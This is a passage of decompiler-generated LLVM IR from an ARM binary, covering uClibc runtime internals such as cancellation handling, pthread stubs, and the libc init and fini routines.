  store i32 %v3_14cd4, i32* %stack_var_-16, align 4
  br i1 %v2_14cd0, label %dec_label_pc_14cdc, label %dec_label_pc_14d50

dec_label_pc_14cdc:                               ; preds = %entry
  %v0_14cdc = call i32 @__aeabi_read_tp()
  store i32 %v0_14cdc, i32* %r0.global-to-local, align 4
  %v1_14ce0 = add i32 %v0_14cdc, -1036
  %v2_14ce0 = inttoptr i32 %v1_14ce0 to i32*
  %v3_14ce0 = load i32, i32* %v2_14ce0, align 4
  %v1_14ce4 = add i32 %v0_14cdc, -1168
  store i32 %v1_14ce4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14ce8

dec_label_pc_14ce8:                               ; preds = %dec_label_pc_14d1c.dec_label_pc_14ce8_crit_edge, %dec_label_pc_14cdc
  %v0_14cf4 = phi i32 [ %v0_14cf4.pre, %dec_label_pc_14d1c.dec_label_pc_14ce8_crit_edge ], [ %v1_14ce4, %dec_label_pc_14cdc ]
  %v0_14ce8 = phi i32 [ %v0_14d1c, %dec_label_pc_14d1c.dec_label_pc_14ce8_crit_edge ], [ %v3_14ce0, %dec_label_pc_14cdc ]
  %v1_14ce8 = and i32 %v0_14ce8, -3
  store i32 %v1_14ce8, i32* %r7.global-to-local, align 4
  store i32 %v0_14ce8, i32* %r4.global-to-local, align 4
  store i32 %v1_14ce8, i32* @r1, align 4
  %v1_14cf4 = add i32 %v0_14cf4, 132
  store i32 %v1_14cf4, i32* @r2, align 4
  %v1_14cf823 = inttoptr i32 %v1_14cf4 to i32*
  %v2_14cf824 = load i32, i32* %v1_14cf823, align 4
  %v3_14cfc26 = icmp uge i32 %v2_14cf824, %v0_14ce8
  store i1 %v3_14cfc26, i1* %cpsr_c.global-to-local, align 1
  %v9_14cfc32 = icmp eq i32 %v2_14cf824, %v0_14ce8
  br i1 %v9_14cfc32, label %dec_label_pc_14d04, label %dec_label_pc_14d1c

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14ce8, %dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge
  %v0_14d0433 = phi i32 [ %v1_14cfc.pre, %dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge ], [ %v0_14ce8, %dec_label_pc_14ce8 ]
  store i32 %v0_14d0433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14d14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d14, label %dec_label_pc_14d18, label %dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge

dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge:  ; preds = %dec_label_pc_14d04
  %v0_14cf8.pre = load i32, i32* @r2, align 4
  %v1_14cfc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14cf8 = inttoptr i32 %v0_14cf8.pre to i32*
  %v2_14cf8 = load i32, i32* %v1_14cf8, align 4
  %v3_14cfc = icmp uge i32 %v2_14cf8, %v1_14cfc.pre
  store i1 %v3_14cfc, i1* %cpsr_c.global-to-local, align 1
  %v9_14cfc = icmp eq i32 %v2_14cf8, %v1_14cfc.pre
  br i1 %v9_14cfc, label %dec_label_pc_14d04, label %dec_label_pc_14d1c

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d04
  %v0_14d18 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14ce8, %dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge, %dec_label_pc_14d18
  %v0_14d1c = phi i32 [ %v0_14d18, %dec_label_pc_14d18 ], [ %v2_14cf824, %dec_label_pc_14ce8 ], [ %v2_14cf8, %dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge ]
  %v1_14d1c = phi i32 [ %v0_14d18, %dec_label_pc_14d18 ], [ %v0_14ce8, %dec_label_pc_14ce8 ], [ %v1_14cfc.pre, %dec_label_pc_14d04.dec_label_pc_14cf8_crit_edge ]
  %v3_14d1c = icmp uge i32 %v0_14d1c, %v1_14d1c
  store i1 %v3_14d1c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d1c = icmp eq i32 %v0_14d1c, %v1_14d1c
  br i1 %v9_14d1c, label %dec_label_pc_14d44.preheader, label %dec_label_pc_14d1c.dec_label_pc_14ce8_crit_edge

dec_label_pc_14d1c.dec_label_pc_14ce8_crit_edge:  ; preds = %dec_label_pc_14d1c
  %v0_14cf4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14ce8

dec_label_pc_14d44.preheader:                     ; preds = %dec_label_pc_14d1c
  %v0_14d441 = load i32, i32* %r7.global-to-local, align 4
  %v1_14d442 = and i32 %v0_14d441, 12
  store i32 %v1_14d442, i32* @r3, align 4
  %v2_14d483 = icmp ugt i32 %v1_14d442, 3
  store i1 %v2_14d483, i1* %cpsr_c.global-to-local, align 1
  %v7_14d485 = icmp eq i32 %v1_14d442, 4
  br i1 %v7_14d485, label %dec_label_pc_14d28.lr.ph, label %dec_label_pc_14d44.preheader.dec_label_pc_14d50.loopexit_crit_edge

dec_label_pc_14d44.preheader.dec_label_pc_14d50.loopexit_crit_edge: ; preds = %dec_label_pc_14d44.preheader
  %v1_14d54.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d50.loopexit

dec_label_pc_14d28.lr.ph:                         ; preds = %dec_label_pc_14d44.preheader
  %v0_14d2c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_14d2c = add i32 %v0_14d2c.pre, 132
  %v2_14d40 = inttoptr i32 %v1_14d2c to i32*
  br label %dec_label_pc_14d28

dec_label_pc_14d28:                               ; preds = %dec_label_pc_14d28.lr.ph, %dec_label_pc_14d28
  %v0_14d28 = phi i32 [ %v0_14d441, %dec_label_pc_14d28.lr.ph ], [ %v3_14d40, %dec_label_pc_14d28 ]
  store i32 %v0_14d28, i32* @r2, align 4
  store i32 %v1_14d2c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14d40 = load i32, i32* %v2_14d40, align 4
  store i32 %v3_14d40, i32* %r7.global-to-local, align 4
  %v1_14d44 = and i32 %v3_14d40, 12
  store i32 %v1_14d44, i32* @r3, align 4
  %v7_14d48 = icmp eq i32 %v1_14d44, 4
  br i1 %v7_14d48, label %dec_label_pc_14d28, label %dec_label_pc_14d44.dec_label_pc_14d50.loopexit_crit_edge

dec_label_pc_14d44.dec_label_pc_14d50.loopexit_crit_edge: ; preds = %dec_label_pc_14d28
  %v2_14d48 = icmp ugt i32 %v1_14d44, 3
  store i1 %v2_14d48, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14d50.loopexit

dec_label_pc_14d50.loopexit:                      ; preds = %dec_label_pc_14d44.preheader.dec_label_pc_14d50.loopexit_crit_edge, %dec_label_pc_14d44.dec_label_pc_14d50.loopexit_crit_edge
  %v1_14d54.pre = phi i32 [ %v1_14d54.pre.pre, %dec_label_pc_14d44.preheader.dec_label_pc_14d50.loopexit_crit_edge ], [ %v1_14d2c, %dec_label_pc_14d44.dec_label_pc_14d50.loopexit_crit_edge ]
  %v2_14d50.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14d50

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14d50.loopexit, %entry
  %v1_14d54 = phi i32 [ %v1_14d54.pre, %dec_label_pc_14d50.loopexit ], [ %v0_14cd0, %entry ]
  %v2_14d50 = phi i32 [ %v2_14d50.pre, %dec_label_pc_14d50.loopexit ], [ %v3_14cd4, %entry ]
  store i32 %v2_14d50, i32* @r4, align 4
  ret i32 %v1_14d54

; uselistorder directives
  uselistorder i32 %v3_14d40, { 1, 2, 0 }
  uselistorder i32 %v1_14d2c, { 0, 2, 1 }
  uselistorder i32 %v0_14d18, { 1, 0 }
  uselistorder i32 %v1_14cfc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14ce8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_14d50.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14d28, { 1, 0 }
  uselistorder label %dec_label_pc_14d1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d04, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14d58 = load i32, i32* @r4, align 4
  store i32 %v3_14d58, i32* %stack_var_-24, align 4
  store i32 54472, i32* %r8.global-to-local, align 4
  %v0_14d60 = call i32 @__aeabi_read_tp()
  %v1_14d64 = add i32 %v0_14d60, -1036
  %v2_14d64 = inttoptr i32 %v1_14d64 to i32*
  %v3_14d64 = load i32, i32* %v2_14d64, align 4
  store i32 %v3_14d64, i32* %r6.global-to-local, align 4
  %v1_14d68 = add i32 %v0_14d60, -1168
  store i32 %v1_14d68, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r8.global-to-local, align 4
  %v1_14d7046 = or i32 %v3_14d64, 2
  store i32 %v1_14d7046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d7449 = icmp eq i32 %v1_14d7046, %v3_14d64
  br i1 %v9_14d7449, label %dec_label_pc_14e20, label %dec_label_pc_14d7c

dec_label_pc_14d7c:                               ; preds = %entry, %bb.dec_label_pc_14d7c_crit_edge
  %v0_14d80 = phi i32 [ %v0_14d80.pre, %bb.dec_label_pc_14d7c_crit_edge ], [ %v1_14d68, %entry ]
  %v1_14d7051 = phi i32 [ %v1_14d70, %bb.dec_label_pc_14d7c_crit_edge ], [ %v1_14d7046, %entry ]
  %v0_14d8450 = phi i32 [ %v1_14db0, %bb.dec_label_pc_14d7c_crit_edge ], [ %v3_14d64, %entry ]
  store i32 %v1_14d7051, i32* @r1, align 4
  %v1_14d80 = add i32 %v0_14d80, 132
  store i32 %v1_14d80, i32* @r2, align 4
  store i32 %v0_14d8450, i32* %r4.global-to-local, align 4
  %v1_14d8834 = inttoptr i32 %v1_14d80 to i32*
  %v2_14d8835 = load i32, i32* %v1_14d8834, align 4
  store i32 %v2_14d8835, i32* @r3, align 4
  %v3_14d8c37 = icmp uge i32 %v2_14d8835, %v0_14d8450
  store i1 %v3_14d8c37, i1* %cpsr_c.global-to-local, align 1
  %v9_14d8c43 = icmp eq i32 %v2_14d8835, %v0_14d8450
  br i1 %v9_14d8c43, label %dec_label_pc_14d94, label %dec_label_pc_14dac

dec_label_pc_14d94:                               ; preds = %dec_label_pc_14d7c, %dec_label_pc_14d94.dec_label_pc_14d88_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14da4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14da4, label %dec_label_pc_14da8, label %dec_label_pc_14d94.dec_label_pc_14d88_crit_edge

dec_label_pc_14d94.dec_label_pc_14d88_crit_edge:  ; preds = %dec_label_pc_14d94
  %v0_14d88.pre = load i32, i32* @r2, align 4
  %v1_14d8c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d88 = inttoptr i32 %v0_14d88.pre to i32*
  %v2_14d88 = load i32, i32* %v1_14d88, align 4
  store i32 %v2_14d88, i32* @r3, align 4
  %v3_14d8c = icmp uge i32 %v2_14d88, %v1_14d8c.pre
  store i1 %v3_14d8c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d8c = icmp eq i32 %v2_14d88, %v1_14d8c.pre
  br i1 %v9_14d8c, label %dec_label_pc_14d94, label %dec_label_pc_14dac

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d94
  %v0_14da8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14da8, i32* @r3, align 4
  br label %dec_label_pc_14dac

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14d7c, %dec_label_pc_14d94.dec_label_pc_14d88_crit_edge, %dec_label_pc_14da8
  %v1_14db0 = phi i32 [ %v0_14da8, %dec_label_pc_14da8 ], [ %v2_14d8835, %dec_label_pc_14d7c ], [ %v2_14d88, %dec_label_pc_14d94.dec_label_pc_14d88_crit_edge ]
  %v1_14dac = load i32, i32* %r6.global-to-local, align 4
  %v3_14dac = icmp uge i32 %v1_14db0, %v1_14dac
  store i1 %v3_14dac, i1* %cpsr_c.global-to-local, align 1
  %v9_14dac = icmp eq i32 %v1_14db0, %v1_14dac
  br i1 %v9_14dac, label %dec_label_pc_14db8, label %bb

bb:                                               ; preds = %dec_label_pc_14dac
  store i32 %v1_14db0, i32* %r6.global-to-local, align 4
  %v1_14d70 = or i32 %v1_14db0, 2
  store i32 %v1_14d70, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d74 = icmp eq i32 %v1_14d70, %v1_14db0
  br i1 %v9_14d74, label %dec_label_pc_14e20, label %bb.dec_label_pc_14d7c_crit_edge

bb.dec_label_pc_14d7c_crit_edge:                  ; preds = %bb
  %v0_14d80.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d7c

dec_label_pc_14db8:                               ; preds = %dec_label_pc_14dac
  %v0_14db8 = load i32, i32* %r5.global-to-local, align 4
  %v1_14db8 = and i32 %v0_14db8, -69
  store i32 %v1_14db8, i32* @r3, align 4
  %v2_14dbc = icmp ugt i32 %v1_14db8, 9
  store i1 %v2_14dbc, i1* %cpsr_c.global-to-local, align 1
  %v7_14dbc = icmp eq i32 %v1_14db8, 10
  br i1 %v7_14dbc, label %dec_label_pc_14dc4, label %dec_label_pc_14e20

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14db8
  %v1_14dc8 = load i32, i32* %r7.global-to-local, align 4
  %v2_14dc8 = add i32 %v1_14dc8, 544
  %v3_14dc8 = inttoptr i32 %v2_14dc8 to i32*
  store i32 -1, i32* %v3_14dc8, align 4
  %v0_14dcc = load i32, i32* @r2, align 4
  store i32 %v0_14dcc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14dd0

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14e04.dec_label_pc_14dd0_crit_edge, %dec_label_pc_14dc4
  %v0_14dd4 = phi i32 [ %v0_14dd4.pre, %dec_label_pc_14e04.dec_label_pc_14dd0_crit_edge ], [ %v0_14dcc, %dec_label_pc_14dc4 ]
  %v0_14dd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_14dd0 = add i32 %v0_14dd0, 132
  %v2_14dd0 = inttoptr i32 %v1_14dd0 to i32*
  %v3_14dd0 = load i32, i32* %v2_14dd0, align 4
  store i32 %v0_14dd4, i32* @r2, align 4
  store i32 %v3_14dd0, i32* %r4.global-to-local, align 4
  %v1_14ddc = or i32 %v3_14dd0, 16
  store i32 %v1_14ddc, i32* @r1, align 4
  %v1_14de022 = inttoptr i32 %v0_14dd4 to i32*
  %v2_14de023 = load i32, i32* %v1_14de022, align 4
  %v3_14de425 = icmp uge i32 %v2_14de023, %v3_14dd0
  store i1 %v3_14de425, i1* %cpsr_c.global-to-local, align 1
  %v9_14de431 = icmp eq i32 %v2_14de023, %v3_14dd0
  br i1 %v9_14de431, label %dec_label_pc_14dec, label %dec_label_pc_14e04

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14dd0, %dec_label_pc_14dec.dec_label_pc_14de0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14dfc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14dfc, label %dec_label_pc_14e00, label %dec_label_pc_14dec.dec_label_pc_14de0_crit_edge

dec_label_pc_14dec.dec_label_pc_14de0_crit_edge:  ; preds = %dec_label_pc_14dec
  %v0_14de0.pre = load i32, i32* @r2, align 4
  %v1_14de4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14de0 = inttoptr i32 %v0_14de0.pre to i32*
  %v2_14de0 = load i32, i32* %v1_14de0, align 4
  %v3_14de4 = icmp uge i32 %v2_14de0, %v1_14de4.pre
  store i1 %v3_14de4, i1* %cpsr_c.global-to-local, align 1
  %v9_14de4 = icmp eq i32 %v2_14de0, %v1_14de4.pre
  br i1 %v9_14de4, label %dec_label_pc_14dec, label %dec_label_pc_14e04

dec_label_pc_14e00:                               ; preds = %dec_label_pc_14dec
  %v0_14e00 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e04

dec_label_pc_14e04:                               ; preds = %dec_label_pc_14dd0, %dec_label_pc_14dec.dec_label_pc_14de0_crit_edge, %dec_label_pc_14e00
  %v0_14e04 = phi i32 [ %v0_14e00, %dec_label_pc_14e00 ], [ %v2_14de023, %dec_label_pc_14dd0 ], [ %v2_14de0, %dec_label_pc_14dec.dec_label_pc_14de0_crit_edge ]
  %v1_14e04 = phi i32 [ %v0_14e00, %dec_label_pc_14e00 ], [ %v3_14dd0, %dec_label_pc_14dd0 ], [ %v1_14de4.pre, %dec_label_pc_14dec.dec_label_pc_14de0_crit_edge ]
  %v3_14e04 = icmp uge i32 %v0_14e04, %v1_14e04
  store i1 %v3_14e04, i1* %cpsr_c.global-to-local, align 1
  %v9_14e04 = icmp eq i32 %v0_14e04, %v1_14e04
  br i1 %v9_14e04, label %dec_label_pc_14e0c, label %dec_label_pc_14e04.dec_label_pc_14dd0_crit_edge

dec_label_pc_14e04.dec_label_pc_14dd0_crit_edge:  ; preds = %dec_label_pc_14e04
  %v0_14dd4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14dd0

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14e04
  store i32 116, i32* @r3, align 4
  %v0_14e14 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e14 = add i32 %v0_14e14, 116
  %v3_14e14 = inttoptr i32 %v2_14e14 to i32*
  %v4_14e14 = load i32, i32* %v3_14e14, align 4
  store i32 %v4_14e14, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14e14)
  %v0_14e20.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e20

dec_label_pc_14e20:                               ; preds = %entry, %bb, %dec_label_pc_14db8, %dec_label_pc_14e0c
  %v0_14e20 = phi i32 [ %v1_14db0, %dec_label_pc_14db8 ], [ %v0_14e20.pre, %dec_label_pc_14e0c ], [ %v3_14d64, %entry ], [ %v1_14db0, %bb ]
  %v2_14e24 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14e24, i32* @r4, align 4
  ret i32 %v0_14e20

; uselistorder directives
  uselistorder i32 %v0_14e00, { 1, 0 }
  uselistorder i32 %v1_14de4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14d70, { 1, 2, 0 }
  uselistorder i32 %v1_14dac, { 1, 0 }
  uselistorder i32 %v1_14db0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_14d8c.pre, { 1, 0 }
  uselistorder i32 %v0_14d8450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 2, 6, 10, 7, 9, 8, 0, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14e20, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14e04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14dec, { 1, 0 }
  uselistorder label %dec_label_pc_14dac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d94, { 1, 0 }
  uselistorder label %dec_label_pc_14d7c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14e44 = add i32 %tmp, 4
  %v4_14e44 = inttoptr i32 %v3_14e44 to i32*
  store i32 %arg3, i32* %v4_14e44, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14e50 = icmp eq i32 %arg2, 0
  br i1 %v2_14e50, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14e68 = call i32 @__libc_errno()
  ret i32 %v3_14e68

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14e9c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14e78 = load i32, i32* @r4, align 4
  store i32 %v3_14e78, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e9c

dec_label_pc_14e9c:                               ; preds = %dec_label_pc_14e9c.dec_label_pc_14e9c_crit_edge, %dec_label_pc_14e9c.lr.ph
  %v1_14e9c = phi i32 [ %v1_14ea8, %dec_label_pc_14e9c.dec_label_pc_14e9c_crit_edge ], [ 0, %dec_label_pc_14e9c.lr.ph ]
  %v0_14e9c = phi i32 [ %v0_14e9c.pre, %dec_label_pc_14e9c.dec_label_pc_14e9c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -8), %dec_label_pc_14e9c.lr.ph ]
  %v4_14e9c = mul i32 %v1_14e9c, 4
  %v5_14e9c = add i32 %v4_14e9c, %v0_14e9c
  %v6_14e9c = inttoptr i32 %v5_14e9c to i32*
  %v7_14e9c = load i32, i32* %v6_14e9c, align 4
  call void @__pseudo_branch(i32 %v7_14e9c)
  %v0_14ea8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ea8 = add i32 %v0_14ea8, -1
  store i32 %v1_14ea8, i32* %r4.global-to-local, align 4
  %v2_14ea8 = icmp eq i32 %v0_14ea8, 0
  br i1 %v2_14ea8, label %dec_label_pc_14eb0, label %dec_label_pc_14e9c.dec_label_pc_14e9c_crit_edge

dec_label_pc_14e9c.dec_label_pc_14e9c_crit_edge:  ; preds = %dec_label_pc_14e9c
  %v0_14e9c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e9c

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e9c
  %v0_14eb4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14eb4 = add i32 %v0_14eb4.pre, 2004
  %v3_14eb4 = inttoptr i32 %v2_14eb4 to i32*
  %v4_14eb4 = load i32, i32* %v3_14eb4, align 4
  %v2_14eb8 = icmp eq i32 %v4_14eb4, 0
  br i1 %v2_14eb8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14eb0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14eb0, %bb
  %v2_14ec0 = xor i1 %v2_14eb8, true
  call void @__pseudo_cond_branch(i1 %v2_14ec0, i32 %v4_14eb4)
  %v0_14ec8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ec8 = add i32 %v0_14ec8, 2008
  %v3_14ec8 = inttoptr i32 %v2_14ec8 to i32*
  %v4_14ec8 = load i32, i32* %v3_14ec8, align 4
  %v2_14ecc = icmp eq i32 %v4_14ec8, 0
  br i1 %v2_14ecc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14ed4 = xor i1 %v2_14ecc, true
  call void @__pseudo_cond_branch(i1 %v2_14ed4, i32 %v4_14ec8)
  %v2_14ed8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14ed8, i32* %r4.global-to-local, align 4
  %v1_14edc = load i32, i32* @r0, align 4
  ret i32 %v1_14edc

; uselistorder directives
  uselistorder i32 %v1_14ea8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14ef4 = load i32, i32* @r4, align 4
  %v6_14ef4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14f08 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14f10 = icmp eq i32 %v2_14f08, -1
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r3, align 4
  br i1 %v3_14f10, label %dec_label_pc_14f1c, label %dec_label_pc_14f34

dec_label_pc_14f1c:                               ; preds = %entry
  %v0_14f20 = load i32, i32* @r5, align 4
  %v2_14f28 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33916), i32 %v0_14f20)
  %v1_14f2c = load i32, i32* @r4, align 4
  %v1_14f30 = icmp ne i32 %v2_14f28, %v1_14f2c
  call void @__pseudo_cond_branch(i1 %v1_14f30, i32 ptrtoint (i32* @global_var_13858.560 to i32))
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %entry, %dec_label_pc_14f1c
  %v1_14f3c = phi i32 [ %v2_14f08, %entry ], [ %v2_14f28, %dec_label_pc_14f1c ]
  store i32 %v3_14ef4, i32* @r4, align 4
  store i32 %v6_14ef4, i32* @r5, align 4
  ret i32 %v1_14f3c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f48 = load i32, i32* @r4, align 4
  store i32 %v3_14f48, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r4.global-to-local, align 4
  %v4_14f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 148) to i32*), align 4
  %v1_14f5c = inttoptr i32 %v4_14f58 to i32*
  %v2_14f5c = load i32, i32* %v1_14f5c, align 4
  %v2_14f60 = icmp eq i32 %v2_14f5c, 0
  br i1 %v2_14f60, label %dec_label_pc_14f68, label %dec_label_pc_14f8c

dec_label_pc_14f68:                               ; preds = %entry
  store i32 4096, i32* %v1_14f5c, align 4
  %v0_14f70 = call i32 @__pthread_initialize_minimal()
  %v0_14f78 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f78 = add i32 %v0_14f78, -47912
  %v2_14f80 = icmp eq i32 %v2_14f78, 0
  br i1 %v2_14f80, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14f68
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14f68, %bb
  %v2_14f88 = xor i1 %v2_14f80, true
  call void @__pseudo_cond_branch(i1 %v2_14f88, i32 %v2_14f78)
  %v2_14f8c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14f8c

dec_label_pc_14f8c:                               ; preds = %entry, %bb4
  %v2_14f8c = phi i32 [ %v2_14f8c.pre, %bb4 ], [ %v3_14f48, %entry ]
  %.0 = phi i32 [ %v0_14f70, %bb4 ], [ undef, %entry ]
  store i32 %v2_14f8c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_14f8c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53884, i32* %r4.global-to-local, align 4
